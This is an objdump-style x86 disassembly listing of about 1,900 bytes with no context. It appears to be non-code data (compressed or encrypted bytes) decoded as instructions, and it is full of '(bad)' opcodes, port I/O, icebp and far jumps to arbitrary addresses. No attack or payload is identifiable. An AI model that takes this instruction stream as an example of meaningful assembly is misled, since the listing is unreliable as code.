  439cf6:	mov    bh,0xf3
  439cf8:	inc    esi
  439cf9:	cmp    DWORD PTR [ebx+0x4b],edi
  439cfc:	sbb    eax,0xf0c7b8b3
  439d01:	punpckhwd mm0,QWORD PTR [eax]
  439d04:	jne    0x439d31
  439d06:	std    
  439d07:	cld    
  439d08:	or     dl,bh
  439d0a:	div    DWORD PTR [esi-0x750c4102]
  439d10:	fisubr WORD PTR [ebx]
  439d12:	std    
  439d13:	push   DWORD PTR [ebp+0x4]
  439d16:	ss and eax,0x7304a2b7
  439d1c:	in     eax,dx
  439d1d:	scas   al,BYTE PTR es:[edi]
  439d1e:	mov    edx,0xfd2b1df8
  439d23:	push   DWORD PTR [ebp+0x7c]
  439d26:	test   DWORD PTR fs:[eax-0x6d],eax
  439d2a:	jns    0x439ceb
  439d2c:	inc    ecx
  439d2d:	cs jb  0x439cd4
  439d30:	cdq    
  439d31:	sub    edi,ebp
  439d33:	push   DWORD PTR [ebp-0x66]
  439d36:	pop    esp
  439d37:	xor    DWORD PTR [esi+ebp*1+0x2b5834b],0xffffffdb
  439d3f:	imul   edi
  439d41:	rcr    BYTE PTR [ecx+0x25],cl
  439d44:	stos   BYTE PTR es:[edi],al
  439d45:	add    eax,0x3a267b37
  439d4a:	add    DWORD PTR ds:[edi+edi*4+0x43e],esi
  439d52:	add    BYTE PTR [eax],al
  439d54:	add    BYTE PTR [ebp+0x2],dh
  439d57:	out    0x84,eax
  439d59:	ss xor ah,ch
  439d5c:	mov    ebp,DWORD PTR [ecx+edi*1-0x19]
  439d60:	add    edx,edi
  439d62:	add    ebp,DWORD PTR [ebx-0xf50e95a]
  439d68:	or     al,0xbe
  439d6a:	es loop 0x439dec
  439d6d:	cmp    BYTE PTR [edx],al
  439d6f:	out    0x3,eax
  439d71:	lock (bad) 
  439d73:	idiv   al
  439d75:	add    eax,0x6ebf6e13
  439d7a:	or     DWORD PTR [edx],edi
  439d7c:	call   0x47cf9b43
  439d81:	jl     0x439d03
  439d83:	sti    
  439d84:	dec    eax
  439d85:	sbb    al,0x39
  439d87:	outs   dx,BYTE PTR ds:[esi]
  439d88:	into   
  439d89:	cs in  eax,0x5b
  439d8c:	dec    esp
  439d8d:	cli    
  439d8e:	scas   al,BYTE PTR es:[edi]
  439d8f:	mov    ds:0xf252860c,al
  439d94:	jg     0x439d99
  439d96:	cmp    BYTE PTR [edx-0x45310fb8],bh
  439d9c:	jle    0x439d61
  439d9e:	scas   al,BYTE PTR es:[edi]
  439d9f:	fidivr WORD PTR [esi+edi*1+0x36]
  439da3:	jo     0x439d5b
  439da5:	out    0x8c,al
  439da7:	mov    eax,0x5e2a367c
  439dac:	mov    dh,0xba
  439dae:	xchg   bl,ah
  439db0:	jnp    0x439da2
  439db2:	dec    esp
  439db3:	into   
  439db4:	cmp    eax,0x8b8ebefa
  439db9:	add    BYTE PTR [eax],al
  439dbb:	add    BYTE PTR [eax],al
  439dbd:	add    BYTE PTR [edx+0x76e90038],bh
  439dc3:	aaa    
  439dc4:	rcr    BYTE PTR [edx+0x5552ef16],1
  439dca:	leave  
  439dcb:	sbb    ecx,DWORD PTR [ebx-0x6f9b342b]
  439dd1:	out    0xe5,al
  439dd3:	sti    
  439dd4:	and    al,0x26
  439dd6:	or     eax,DWORD PTR [edx+0x7a]
  439dd9:	cmc    
  439dda:	mov    eax,0x70277cf7
  439ddf:	aaa    
  439de0:	mov    ecx,0x6e2c23f2
  439de5:	inc    edx
  439de6:	jmp    0x13b6619e
  439deb:	push   eax
  439dec:	test   DWORD PTR [esi+ebx*2+0x76e8ff7b],esp
  439df3:	add    cl,ch
  439df5:	push   es
  439df6:	jno    0x439e49
  439df8:	xchg   DWORD PTR [edx+edx*4-0xedeac81],eax
  439dff:	cmp    bh,bh
  439e01:	jnp    0x439e31
  439e03:	mov    ecx,0x27195f5
  439e08:	add    dl,dl
  439e0a:	push   ds
  439e0b:	mov    bh,0xf7
  439e0d:	jmp    0x439e54
  439e0f:	add    BYTE PTR [edi-0x2d],bh
  439e12:	leave  
  439e13:	xor    eax,0x9e27e9f9
  439e18:	test   BYTE PTR [edi+0x7213b37e],bl
  439e1e:	sti    
  439e1f:	jg     0x439e2d
  439e21:	pop    ecx
  439e22:	add    BYTE PTR [eax],al
  439e24:	add    BYTE PTR [eax],al
  439e26:	add    BYTE PTR [esi+0xc],ch
  439e29:	xchg   BYTE PTR [edi*1+0x7878448a],ah
  439e30:	jge    0x439e34
  439e32:	jb     0x439e50
  439e34:	and    BYTE PTR ds:0xfe2f38a1,ah
  439e3a:	pop    edi
  439e3b:	add    al,0x48
  439e3d:	bound  eax,QWORD PTR [eax]
  439e3f:	inc    ebp
  439e40:	jp     0x439dcb
  439e42:	add    ah,ch
  439e44:	and    al,0xf7
  439e46:	jmp    FWORD PTR [ebx]
  439e48:	mov    ebx,0xbe11f83c
  439e4d:	jae    0x439e68
  439e4f:	xchg   BYTE PTR [ecx-0x13],ch
  439e52:	xor    ebx,DWORD PTR [esi+0x58]
  439e55:	adc    BYTE PTR [ebp-0x72],0xbc
  439e59:	dec    esp
  439e5a:	call   0x404cdfb1
  439e5f:	add    al,0x69
  439e61:	or     cl,BYTE PTR [ebx+0xc8233c9]
  439e67:	fidivr WORD PTR [ebx+0x71d7d83c]
  439e6d:	cmc    
  439e6e:	lea    ebp,[eax-0x7e]
  439e71:	add    BYTE PTR [eax],al
  439e73:	dec    esp
  439e74:	add    eax,DWORD PTR [ebx+0x7fe5045]
  439e7a:	mov    edx,DWORD PTR [ecx]
  439e7c:	sub    edx,DWORD PTR [edi+ebx*2-0x3b]
  439e80:	cs sub al,0xc0
  439e83:	fidivr DWORD PTR [ebx+0x6b5f5ddc]
  439e89:	pop    eax
  439e8a:	mov    eax,0x0
  439e8f:	add    BYTE PTR ds:0xba000003,bl
  439e95:	mov    ebx,0xbbcf5ddc
  439e9a:	not    BYTE PTR [ebp-0x69]
  439e9d:	iret   
  439e9e:	js     0x439e8c
  439ea0:	int3   
  439ea1:	add    BYTE PTR [eax],al
  439ea3:	add    ch,ch
  439ea5:	jbe    0x439e60
  439ea7:	inc    ebx
  439ea8:	or     al,0x14
  439eaa:	mov    ebp,0x80caa189
  439eaf:	test   DWORD PTR [ecx+ecx*8-0x459a000a],edi
  439eb6:	(bad)  
  439eb8:	sti    
  439eb9:	mov    edi,0x71759580
  439ebe:	dec    eax
  439ebf:	stc    
  439ec0:	retf   0x67a1
  439ec3:	aam    0xc0
  439ec5:	jg     0x439f09
  439ec7:	xchg   DWORD PTR [eax],eax
  439ec9:	cdq    
  439eca:	dec    eax
  439ecb:	stc    
  439ecc:	mov    dl,0xa1
  439ece:	xchg   esp,ecx
  439ed0:	test   al,0xa7
  439ed2:	inc    ecx
  439ed3:	vpsubq zmm3{k4},zmm1,ZMMWORD PTR [edx+0x8bdad7]
  439edd:	mov    ebp,0x3e8af947
  439ee2:	jno    0x439e7f
  439ee4:	lods   eax,DWORD PTR ds:[esi]
  439ee5:	mov    ebp,0xa513f941
  439eea:	jg     0x439eb0
  439eec:	jo     0x439edb
  439eee:	inc    ecx
  439eef:	(bad)  
  439ef0:	stc    
  439ef1:	jle    0x439f30
  439ef3:	sti    
  439ef4:	add    BYTE PTR [eax],al
  439ef6:	add    BYTE PTR [eax],al
  439ef8:	add    BYTE PTR [edx-0x23],ah
  439efb:	fimul  DWORD PTR [ebx-0x6b827f8]
  439f01:	push   edx
  439f02:	mov    al,0x71
  439f04:	add    DWORD PTR [ebp+0x7],0x42
  439f08:	stc    
  439f09:	out    dx,al
  439f0a:	data16 stc 
  439f0c:	xchg   al,dh
  439f0e:	adc    ecx,DWORD PTR [eax-0x7]
  439f11:	xor    bl,BYTE PTR [edi-0x60cdfc41]
  439f17:	or     al,0xfb
  439f19:	and    bl,BYTE PTR ds:0x2b74fffd
  439f1f:	jbe    0x439ea4
  439f21:	or     DWORD PTR [edi+0x43],ecx
  439f24:	stc    
  439f25:	(bad)  
  439f26:	jmp    0x439f6f
  439f28:	push   0xffc3ef25
  439f2d:	in     eax,dx
  439f2e:	sahf   
  439f2f:	pop    edi
  439f30:	sti    
  439f31:	repnz ins BYTE PTR es:[edi],dx
  439f33:	inc    ebx
  439f34:	adc    eax,DWORD PTR [ebp-0x100042a7]
  439f3a:	add    dh,BYTE PTR [eax+ecx*2]
  439f3d:	mov    BYTE PTR [edi-0x71],al
  439f40:	cmc    
  439f41:	shl    BYTE PTR ds:0x8a083ae7,cl
  439f47:	mov    ch,BYTE PTR [edi+0x5b2426f9]
  439f4d:	sub    al,0x35
  439f4f:	jp     0x439f96
  439f51:	rol    DWORD PTR [esi-0x52],0xf6
  439f55:	ss inc edx
  439f57:	es add al,0x26
  439f5a:	add    DWORD PTR ds:0x4,esp
  439f60:	add    BYTE PTR [eax],al
  439f62:	jne    0x439f8f
  439f64:	cmp    eax,0x5e3592fe
  439f69:	inc    ebp
  439f6a:	daa    
  439f6b:	mov    DWORD PTR [ebp+0x9],edx
  439f6e:	ret    0xd9ae
  439f71:	jle    0x439efa
  439f73:	scas   al,BYTE PTR es:[edi]
  439f74:	aad    0xb0
  439f76:	stc    
  439f77:	xor    al,0x5d
  439f79:	jmp    0x439f6b
  439f7b:	adc    DWORD PTR [edi-0x14],ebx
  439f7e:	lods   al,BYTE PTR ds:[esi]
  439f7f:	mov    bh,al
  439f81:	ret    
  439f82:	fwait
  439f83:	jg     0x439f96
  439f85:	iret   
  439f86:	arpl   cx,bx
  439f88:	mov    al,0x40
  439f8a:	cmp    DWORD PTR [esi+0x1b],eax
  439f8d:	cmp    BYTE PTR [ecx],dh
  439f8f:	inc    esi
  439f90:	xor    edi,DWORD PTR [eax]
  439f92:	sub    DWORD PTR [esi+0x2b],eax
  439f95:	cmp    BYTE PTR [ecx+0x46],al
  439f98:	pop    esi
  439f99:	inc    ebp
  439f9a:	(bad)  
  439f9b:	mov    ebx,edi
  439f9d:	mov    dl,0xf9
  439f9f:	into   
  439fa0:	out    dx,al
  439fa1:	lods   al,BYTE PTR ds:[esi]
  439fa2:	icebp  
  439fa3:	cmp    DWORD PTR [esi],ebx
  439fa5:	dec    edx
  439fa6:	xchg   DWORD PTR [ebp+ebx*2-0x1c78814a],esp
  439fad:	stc    
  439fae:	mov    cl,0x8b
  439fb0:	sub    al,0x48
  439fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439fb3:	sub    esi,esp
  439fb5:	jbe    0x439ff1
  439fb7:	add    al,BYTE PTR [eax]
  439fb9:	bound  edi,QWORD PTR [ebx+0x6d938538]
  439fbf:	xor    esi,DWORD PTR [ecx-0x31]
  439fc2:	arpl   WORD PTR [esi+0x24],bx
  439fc5:	jmp    0x439fca
  439fca:	add    BYTE PTR [esi+0x2],dh
  439fcd:	add    BYTE PTR [edx+0x3],ah
  439fd0:	adc    DWORD PTR [ebp+0x37],ecx
  439fd3:	push   es
  439fd4:	cmp    dl,BYTE PTR [ebx-0x27]
  439fd7:	cmc    
  439fd8:	cmp    eax,0xb836640c
  439fdd:	std    
  439fde:	popa   
  439fdf:	push   eax
  439fe0:	aaa    
  439fe1:	je     0x439fc0
  439fe3:	ins    DWORD PTR es:[edi],dx
  439fe4:	xor    esi,DWORD PTR [edx+0x4e]
  439fe7:	sbb    eax,0xe3720bc9
  439fec:	cld    
  439fed:	test   BYTE PTR [eax+0xd],bl
  439ff0:	inc    ebx
  439ff1:	xor    eax,0x8319b22e
  439ff6:	xor    BYTE PTR [edx-0x72cd7af3],ch
  439ffc:	dec    ecx
  439ffd:	nop
  439ffe:	arpl   WORD PTR [esi+0x7e],bx
  43a001:	adc    al,0xe8
  43a003:	ficom  WORD PTR [esi]
  43a005:	push   DWORD PTR [esi+0x644012de]
  43a00b:	shr    BYTE PTR [edi+0x80362ef],0x85
  43a012:	mov    ah,0x3e
  43a014:	fcomip st,st(6)
  43a016:	ret    0xb1ac
  43a019:	mov    ds:0x84dadd9f,eax
  43a01e:	or     al,0xd3
  43a020:	jbe    0x439fee
  43a022:	sbb    eax,0xb5cc466a
  43a027:	lds    eax,FWORD PTR [esi-0x34]
  43a02a:	lods   eax,DWORD PTR ds:[esi]
  43a02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a02c:	inc    esi
  43a02d:	int3   
  43a02e:	bound  eax,QWORD PTR [eax]
  43a030:	add    BYTE PTR [eax],al
  43a032:	add    BYTE PTR [eax],al
  43a034:	mov    dh,0xcf
  43a036:	test   BYTE PTR [ebp+0x26f8],bh
  43a03c:	or     eax,0x67530000
  43a041:	and    DWORD PTR [ecx],eax
  43a043:	push   edi
  43a044:	push   edi
  43a045:	inc    ecx
  43a046:	add    eax,0x217a0785
  43a04b:	test   DWORD PTR [ebx],edx
  43a04d:	jnp    0x43a06c
  43a04f:	dec    ecx
  43a051:	aaa    
  43a052:	cmovo  ebx,esp
  43a055:	gs stc 
  43a057:	imul   ecx,esp,0xcc69f965
  43a05d:	gs stc 
  43a05f:	(bad)  
  43a060:	pushf  
  43a061:	sbb    DWORD PTR [eax],eax
  43a063:	add    BYTE PTR [edi+eiz*8-0x40ec011c],bl
  43a06a:	jp     0x43a030
  43a06c:	cwde   
  43a06d:	and    BYTE PTR [ebx+ecx*4+0x39],dl
  43a071:	and    DWORD PTR [esi+edx*2-0x7af686e9],edi
  43a078:	sub    bh,BYTE PTR [eax-0x1]
  43a07b:	xor    BYTE PTR [ecx+0x7975000b],0xbf
  43a082:	or     al,0x38
  43a084:	dec    edx
  43a085:	aas    
  43a086:	stc    
  43a087:	imul   ecx,DWORD PTR [ebp+eiz*2-0x7],0xf9654c69
  43a08f:	imul   ebx,DWORD PTR [eax+ecx*8-0x1],0xffff5c15
  43a097:	out    0x0,eax
  43a099:	add    BYTE PTR [eax],al
  43a09b:	add    BYTE PTR [eax],al
  43a09d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a09e:	shl    dh,0xff
  43a0a1:	iret   
  43a0a2:	retf   0x5e13
  43a0a5:	adc    edx,DWORD PTR [esp+eax*4-0x1b]
  43a0a9:	add    DWORD PTR [edx+edi*2-0x1292f101],edi
  43a0b0:	dec    edi
  43a0b1:	and    esi,DWORD PTR [eax-0x37e8fc0b]
  43a0b7:	cmp    al,0xf4
  43a0b9:	jne    0x43a0e4
  43a0bb:	std    
  43a0bc:	push   DWORD PTR [ebp-0x5e]
  43a0bf:	(bad)  
  43a0c1:	in     al,dx
  43a0c2:	mov    ebp,0x290e8b3b
  43a0c7:	std    
  43a0c8:	push   DWORD PTR [ebp-0x60]
  43a0cb:	inc    ebp
  43a0cc:	and    eax,0xf15337b6
  43a0d1:	jecxz  0x43a0bb
  43a0d3:	cmp    al,0x7d
  43a0d6:	or     al,0x1b
  43a0d8:	test   DWORD PTR [eax],esi
  43a0da:	xor    DWORD PTR [edx-0x2d0696b5],ecx
  43a0e0:	push   ecx
  43a0e1:	es mov al,0x45
  43a0e4:	call   0xf981539d
  43a0e9:	mul    BYTE PTR [ebp+ecx*1-0x19]
  43a0ed:	add    ebp,DWORD PTR [edx]
  43a0ef:	std    
  43a0f0:	(bad)  
  43a0f1:	out    dx,al
  43a0f2:	jne    0x43a109
  43a0f4:	iret   
  43a0f5:	popf   
  43a0f6:	and    ebp,DWORD PTR [esi-0x3e]
  43a0f9:	jbe    0x43a0e3
  43a0fb:	mov    eax,esi
  43a0fd:	sub    edi,DWORD PTR [eax-0x2d]
  43a100:	clc    
  43a101:	add    BYTE PTR [eax],al
  43a103:	add    BYTE PTR [eax],al
  43a105:	add    BYTE PTR [eax],ah
  43a107:	push   ebp
  43a108:	add    ah,0x81
  43a10b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a10c:	cmp    al,0x7a
  43a10e:	jns    0x43a0b4
  43a110:	xlat   BYTE PTR ds:[ebx]
  43a111:	pmaxsw mm2,QWORD PTR [ecx]
  43a114:	mov    bh,BYTE PTR [ebp-0x6c07fb3]
  43a11a:	push   edx
  43a11b:	mov    ch,0xc7
  43a11d:	pop    ss
  43a11e:	mov    ds:0xa8f8cd6c,al
  43a123:	aaa    
  43a124:	add    ah,0x69
  43a127:	sahf   
  43a128:	cmp    al,0x7a
  43a12a:	xor    DWORD PTR [edi+edx*8-0x761701f1],0x3f640dbd
  43a135:	stc    
  43a136:	sbb    al,BYTE PTR [ebx]
  43a138:	outs   dx,BYTE PTR ds:[esi]
  43a139:	iret   
  43a13a:	push   0xffffffd9
  43a13c:	xor    bl,dl
  43a13e:	or     eax,0x3984fad8
  43a143:	jmp    DWORD PTR [ebx+0x44]
  43a146:	jg     0x43a146
  43a148:	ins    DWORD PTR es:[edi],dx
  43a149:	xlat   BYTE PTR ds:[ebx]
  43a14a:	cmp    BYTE PTR [ebp-0x56],0x8d
  43a14e:	mov    bh,0x1a
  43a150:	add    eax,DWORD PTR [edx-0x24]
  43a153:	xor    esi,ebp
  43a155:	xor    al,0x67
  43a157:	or     eax,0xed82dee6
  43a15c:	mov    eax,0x3c7d66b5
  43a161:	sbb    al,0x27
  43a163:	aad    0x34
  43a165:	inc    ecx
  43a166:	es push ss
  43a168:	dec    ax
  43a16a:	add    BYTE PTR [eax],al
  43a16c:	add    BYTE PTR [eax],al
  43a16e:	add    BYTE PTR [ecx-0x6c3d5879],al
  43a174:	in     eax,dx
  43a175:	jne    0x43a130
  43a177:	jg     0x43a17e
  43a179:	or     al,0x14
  43a17b:	pusha  
  43a17c:	iret   
  43a17d:	pop    esi
  43a17e:	mov    ecx,0x1ba47d67
  43a183:	daa    
  43a184:	aad    0xb6
  43a186:	inc    eax
  43a187:	es push ss
  43a189:	dec    ax
  43a18b:	imul   eax,DWORD PTR [edi+0x1d5ac227],0x2b28ee6
  43a195:	(bad)  
  43a196:	mov    esi,0xba28ed72
  43a19b:	push   0x7d
  43a19d:	mov    ah,0x1b
  43a19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a1a0:	fnstenv [edi+0x6616a640]
  43a1a6:	dec    eax
  43a1a7:	jno    0x43a130
  43a1a9:	daa    
  43a1aa:	rcl    DWORD PTR [ebx-0x13],0x21
  43a1ae:	mov    ecx,0x13947d6b
  43a1b3:	lock dec eax
  43a1b5:	add    BYTE PTR [ebp+0x19],bh
  43a1b8:	xchg   ch,al
  43a1ba:	ret    0xc8c5
  43a1bd:	xchg   BYTE PTR [ecx+ecx*2],bh
  43a1c0:	sti    
  43a1c1:	mov    cl,0xf5
  43a1c3:	ja     0x43a23f
  43a1c5:	push   ebx
  43a1c6:	loop   0x43a22d
  43a1c8:	je     0x43a1da
  43a1ca:	popa   
  43a1cb:	bound  esi,QWORD PTR [ecx]
  43a1cd:	or     bh,BYTE PTR [edi-0x35]
  43a1d0:	add    eax,0xd988
  43a1d5:	add    BYTE PTR [eax],al
  43a1d7:	add    cl,bh
  43a1d9:	aam    0xef
  43a1db:	sub    edx,edi
  43a1dd:	aas    
  43a1de:	jae    0x43a1a8
  43a1e0:	fnstenv [ecx]
  43a1e2:	or     DWORD PTR [ebp+ecx*1+0x2a],ebp
  43a1e6:	stc    
  43a1e7:	sahf   
  43a1e8:	stc    
  43a1e9:	push   ds
  43a1ea:	out    0x19,eax
  43a1ec:	xor    al,0x2b
  43a1ee:	stc    
  43a1ef:	jmp    0xe3e9:0x7e3500fb
  43a1f6:	in     al,0xea
  43a1f8:	sti    
  43a1f9:	enter  0xc1ff,0xe3
  43a1fd:	add    BYTE PTR ds:0x8517dc6f,dh
  43a203:	lods   al,BYTE PTR ds:[esi]
  43a204:	outs   dx,BYTE PTR ds:[esi]
  43a205:	aam    0x50
  43a207:	mov    ecx,0x6a13d535
  43a20c:	cmp    bh,dh
  43a20e:	sub    BYTE PTR [ecx],0xc2
  43a211:	daa    
  43a212:	xor    eax,0xe50b283e
  43a217:	jmp    0x22:0x1ffc7fb
  43a21e:	test   DWORD PTR [edx+ebx*4+0x699ff7f5],esp
  43a225:	test   DWORD PTR [ebx+0x1],ecx
  43a228:	das    
  43a229:	ror    DWORD PTR [esi+0x16],cl
  43a22c:	sub    edx,DWORD PTR [edi*2-0x3f7c95db]
  43a233:	add    BYTE PTR [eax+0x284582d9],dh
  43a239:	jl     0x43a288
  43a23b:	clc    
  43a23c:	add    BYTE PTR [eax],al
  43a23e:	add    BYTE PTR [eax],al
  43a240:	add    BYTE PTR [edi+0x37f782bd],dl
  43a246:	mov    edi,0xf557f022
  43a24b:	jnp    0x43a278
  43a24d:	push   edi
  43a24e:	(bad)  
  43a24f:	push   0x15
  43a251:	xchg   edi,eax
  43a252:	push   ecx
  43a253:	in     eax,dx
  43a254:	mov    DWORD PTR [eax-0x4400876f],edx
  43a25a:	out    dx,eax
  43a25b:	cmp    BYTE PTR [ecx+ebx*2+0x2bfff706],0x46
  43a263:	or     BYTE PTR [ebp+0x20],0x2c
  43a267:	shl    DWORD PTR [ebx-0x2b],cl
  43a26a:	jl     0x43a2e1
  43a26c:	clc    
  43a26d:	inc    edi
  43a26e:	imul   ecx,DWORD PTR [ecx],0xe0c28989
  43a274:	imul   ebp,edx,0xd63bf6ef
  43a27a:	jae    0x43a28a
  43a27c:	mov    ebx,DWORD PTR [ecx-0x16]
  43a27f:	sbb    BYTE PTR [ecx+ebx*1+0xbfff86e],0x7d
  43a287:	xchg   esp,eax
  43a288:	lea    ebx,[eax+esi*8+0x7eddfff6]
  43a28f:	inc    ebp
  43a290:	hlt    
  43a291:	addr16 (bad) 
  43a293:	push   0xe
  43a295:	pop    ss
  43a296:	and    ebp,esi
  43a298:	mov    esi,DWORD PTR [ecx]
  43a29a:	adc    eax,DWORD PTR [ecx+0x35ddb47d]
  43a2a0:	(bad)  
  43a2a1:	stos   DWORD PTR es:[edi],eax
  43a2a2:	out    dx,eax
  43a2a3:	xor    BYTE PTR [ebp+0x0],0x0
  43a2a7:	add    BYTE PTR [eax],al
  43a2a9:	add    BYTE PTR [esp+edi*2],bh
  43a2ac:	cmp    eax,0xf8dedff4
  43a2b1:	mov    BYTE PTR [ecx],dl
  43a2b3:	test   DWORD PTR [esi],0x3b207588
  43a2b9:	stc    
  43a2ba:	cmp    ah,BYTE PTR [edi+edx*4+0x3908ad83]
  43a2c1:	stc    
  43a2c2:	(bad)  
  43a2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a2c4:	xchg   BYTE PTR [eax],al
  43a2c6:	and    bh,BYTE PTR [eax]
  43a2c8:	cmp    al,BYTE PTR [edi+0x438c1dc0]
  43a2ce:	or     eax,0xd8556b4
  43a2d3:	push   edx
  43a2d4:	or     bh,dl
  43a2d6:	add    bl,BYTE PTR [eax+0x49]
  43a2d9:	int3   
  43a2da:	sub    esp,ebp
  43a2dc:	rcl    DWORD PTR [eax-0x2],1
  43a2df:	or     al,0xe8
  43a2e1:	paddd  mm4,mm4
  43a2e4:	out    0x13,eax
  43a2e6:	out    dx,al
  43a2e7:	in     al,0xe7
  43a2e9:	pop    ss
  43a2ea:	inc    eax
  43a2eb:	or     edx,esp
  43a2ed:	dec    esi
  43a2ee:	and    al,0x11
  43a2f0:	clc    
  43a2f1:	fs sbb DWORD PTR ss:[ecx-0x2e67708],esp
  43a2f9:	push   DWORD PTR [ebp-0x46]
  43a2fc:	sar    BYTE PTR [edi-0x3c11e6ca],0xfc
  43a303:	in     al,0xe7
  43a305:	pop    es
  43a306:	sbb    DWORD PTR [edx+0x189affe7],esp
  43a30c:	std    
  43a30d:	test   BYTE PTR [eax],al
  43a30f:	add    BYTE PTR [eax],al
  43a311:	add    BYTE PTR [eax],al
  43a313:	cmp    ebp,edi
  43a315:	repz test BYTE PTR ds:0x594c8631,ch
  43a31c:	add    eax,0x48ee16ed
  43a321:	or     DWORD PTR [ebp+0x73],edi
  43a324:	(bad)  
  43a325:	mov    al,0x34
  43a327:	(bad)  
  43a328:	xchg   edi,eax
  43a329:	loope  0x43a35e
  43a32b:	div    cl
  43a32d:	cmp    dh,BYTE PTR [ecx+esi*2+0x30]
  43a331:	das    
  43a332:	jb     0x43a2d7
  43a334:	add    dh,BYTE PTR [edi+esi*8-0x3c]
  43a338:	jg     0x43a2f5
  43a33a:	jb     0x43a3a1
  43a33c:	jns    0x43a31c
  43a33e:	mov    WORD PTR [ebp+0x76ba65fe],gs
  43a344:	add    bh,BYTE PTR [edi+ecx*2-0x63]
  43a348:	add    ebp,eax
  43a34a:	add    esi,DWORD PTR [ebp+0x79]
  43a34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a34e:	or     ecx,DWORD PTR ds:0x7503e359
  43a354:	imul   ebp,eax,0x3
  43a357:	jne    0x43a35b
  43a359:	outs   dx,BYTE PTR ds:[esi]
  43a35a:	sar    DWORD PTR [edx+0x1a],0x93
  43a35e:	or     BYTE PTR [ebp+0x2],dh
  43a361:	mov    esi,0xec7d5974
  43a366:	add    esi,DWORD PTR [ebp+0x2]
  43a369:	out    0x80,eax
  43a36b:	mov    ecx,0x41de120a
  43a370:	inc    ecx
  43a371:	pop    esi
  43a372:	rcl    BYTE PTR [esi+0xc39a06],1
  43a378:	add    BYTE PTR [eax],al
  43a37a:	add    BYTE PTR [eax],al
  43a37c:	jbe    0x43a382
  43a37e:	out    0x3,eax
  43a380:	jne    0x43a3ec
  43a382:	call   0x1346188a
  43a387:	icebp  
  43a388:	stc    
  43a389:	(bad)  
  43a38a:	retf   0xf00b
  43a38d:	mov    edx,0x1abaf0ee
  43a392:	jae    0x43a3cd
  43a394:	pushf  
  43a395:	sub    eax,0xa1d8914
  43a39a:	bound  esi,QWORD PTR [esi+edi*2+0x7c13d72d]
  43a3a1:	mov    dl,0xfa
  43a3a3:	sub    edi,DWORD PTR [edi]
  43a3a5:	sub    eax,0x46f03d4a
  43a3aa:	repz fdivrp st(1),st
  43a3ad:	lds    eax,FWORD PTR [edx]
  43a3af:	or     al,0xf8
  43a3b1:	aad    0xff
  43a3b3:	or     al,0x81
  43a3b5:	test   esi,edi
  43a3b7:	jo     0x43a42d
  43a3b9:	add    al,BYTE PTR [eax]
  43a3bb:	jmp    0xadc87575
  43a3c0:	pop    edx
  43a3c1:	add    eax,0x9d79c085
  43a3c6:	sbb    ecx,DWORD PTR [esi]
  43a3c8:	out    0x14,al
  43a3ca:	stc    
  43a3cb:	js     0x43a3eb
  43a3cd:	and    eax,0x2b61fe13
  43a3d2:	jge    0x43a401
  43a3d4:	test   ecx,ecx
  43a3d6:	mov    ebp,0x51d176e5
  43a3db:	ds and al,0x86
  43a3de:	out    0x1a,al
  43a3e0:	add    BYTE PTR [eax],al
  43a3e2:	add    BYTE PTR [eax],al
  43a3e4:	add    BYTE PTR [ecx-0x58e52b21],bh
  43a3ea:	fcomip st,st(1)
  43a3ec:	sbb    dh,BYTE PTR [eax-0x37dd30d5]
  43a3f2:	retf   0xaa5a
  43a3f5:	in     eax,dx
  43a3f6:	and    eax,DWORD PTR [ebp+0x666cedb8]
  43a3fc:	call   0xe947a79f
  43a401:	jbe    0x43a3e2
  43a403:	mov    edi,0xc6df1dda
  43a408:	fisub  DWORD PTR [edi+ebx*8]
  43a40b:	clc    
  43a40c:	mov    ds,WORD PTR [eax-0x2f]
  43a40f:	test   BYTE PTR [ebp+0x1350d2c5],dl
  43a415:	jns    0x43a3bb
  43a417:	inc    DWORD PTR [eax]
  43a419:	cmp    al,0xa7
  43a41b:	cmp    al,0xe9
  43a41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a41e:	and    al,0xb1
  43a420:	in     al,dx
  43a421:	jbe    0x43a425
  43a423:	pop    ecx
  43a424:	mov    edi,0xbcbcc79d
  43a429:	in     eax,dx
  43a42a:	popf   
  43a42b:	and    esp,ecx
  43a42d:	inc    esp
  43a42e:	mov    ebp,0x242800f8
  43a433:	or     eax,0xf6ede8e8
  43a438:	dec    edi
  43a43a:	ret    
  43a43b:	or     ebx,DWORD PTR [ebp-0x62]
  43a43e:	idiv   edi
  43a440:	retf   
  43a441:	cmp    BYTE PTR [ebx-0x446f3335],0xcb
  43a448:	int3   
  43a449:	add    BYTE PTR [eax],al
  43a44b:	add    BYTE PTR [eax],al
  43a44d:	add    bh,dl
  43a44f:	out    dx,al
  43a450:	dec    esp
  43a451:	mov    esi,DWORD PTR [eax]
  43a453:	lods   al,BYTE PTR ds:[esi]
  43a454:	jmp    0x43a46e
  43a456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a457:	inc    esp
  43a458:	add    DWORD PTR [ebx-0x59],edx
  43a45b:	dec    esp
  43a45c:	or     eax,0x1729756
  43a461:	xor    ecx,esp
  43a463:	push   esi
  43a464:	test   BYTE PTR [esi],al
  43a466:	fiadd  DWORD PTR [ecx-0x8]
  43a469:	add    bl,bl
  43a46b:	inc    ecx
  43a46c:	in     eax,dx
  43a46d:	add    DWORD PTR [eax+eax*1],ecx
  43a470:	add    BYTE PTR [ebp-0x784e9b9],cl
  43a476:	mov    dl,0x72
  43a478:	add    al,0x8b
  43a47a:	xchg   edx,eax
  43a47b:	add    bh,bl
  43a47d:	into   
  43a47e:	fild   WORD PTR [ebx]
  43a480:	cmp    bh,bh
  43a482:	imul   edi,edx,0x7cc04e82
  43a488:	dec    esi
  43a489:	or     bh,cl
  43a48b:	mov    eax,0xe8a60c2a
  43a490:	dec    esp
  43a491:	or     al,0x17
  43a493:	inc    ecx
  43a494:	or     esi,esi
  43a496:	pop    esp
  43a497:	add    bl,BYTE PTR [esi+0xf]
  43a49a:	sbb    DWORD PTR [ecx+edi*8],edx
  43a49d:	dec    DWORD PTR [edx+edi*2+0x3b15e845]
  43a4a4:	cmc    
  43a4a5:	mov    esi,DWORD PTR [edi+0x24458103]
  43a4ab:	jnp    0x43a4ea
